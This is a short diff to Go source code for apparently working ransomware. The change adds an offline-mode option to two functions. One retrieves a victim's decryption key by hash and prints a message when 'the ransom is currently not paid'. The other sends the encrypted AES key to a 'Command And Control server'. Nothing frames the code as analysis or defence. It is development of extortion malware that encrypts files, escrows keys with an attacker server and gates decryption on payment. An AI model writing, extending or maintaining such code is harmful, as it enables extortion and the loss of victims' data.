@@ -66,7 +66,7 @@ func StartDecryption(q *Queue, key string) int {
 				log.Fatal("Failed to read the hash for key retrival")
 			}
 		}
-		keyHex, err := RetriveKeyByHash(string(hash))
+		keyHex, err := RetriveKeyByHash(string(hash), cli.Settings.OfflineMode)
 		if err != nil {
 			if err.Error() == "ransom not paid" {
 				fmt.Println("The ransom is currently not paid. If you made the payment there could be some processing delays so patience is adviced")
@@ -119,7 +119,7 @@ func handleEncryptionKeys(pubKeyBytes []byte, flag *bool) ([]byte, string, error
 		ioutil.WriteFile("./raw_key.bin", keyBytes, 0777)
 	} else {
 		var resp bool
-		resp, err = utils.SendOffKey(encryptedAESKey, wcc.GetHash(keyBytes), cli.Settings.PaidStatus)
+		resp, err = utils.SendOffKey(encryptedAESKey, wcc.GetHash(keyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
 		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(keyBytes)), 0777)
 		if err != nil || !resp {
 			log.Println("Failed to contact Command And Control server")
